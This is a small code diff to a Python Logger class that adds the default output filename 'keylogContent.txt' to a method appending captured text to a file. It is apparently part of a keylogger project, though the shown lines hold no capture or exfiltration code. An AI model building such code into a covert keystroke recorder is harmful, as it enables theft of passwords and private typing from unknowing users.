@@ -15,7 +15,7 @@ class Logger:
         self.text=""
         return captured_text
 
-    def write_to_file(self,filename):
+    def write_to_file(self, filename = "keylogContent.txt"):
         try:
             with open(filename,'a') as file_obj:
                 file_obj.write(self.get_text_out())
